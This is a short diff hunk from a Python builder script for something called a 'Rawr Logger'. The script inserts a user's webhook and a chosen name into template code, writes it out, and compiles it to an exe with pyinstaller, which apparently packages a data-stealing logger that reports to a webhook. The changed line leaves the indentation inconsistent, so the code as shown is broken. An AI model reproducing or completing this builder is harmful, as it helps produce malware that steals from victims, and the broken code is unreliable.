@@ -27,7 +27,7 @@ with open(f"{name}.py", 'w', encoding='utf8') as f:
     f.write(code.text.replace("webhooker", webhook))
     f.write(code.text.replace("lollll", name))
 Write.Print("Rawr Logger Was SucessFully Built\n",Colors.green_to_blue, interval=0.01)
-    compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_blue, interval=0.01)
+compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_blue, interval=0.01)
     if compile == "y":
         os.system(f'pyinstaller --onefile  {name}.py')
         os.remove(f'{name}.spec')
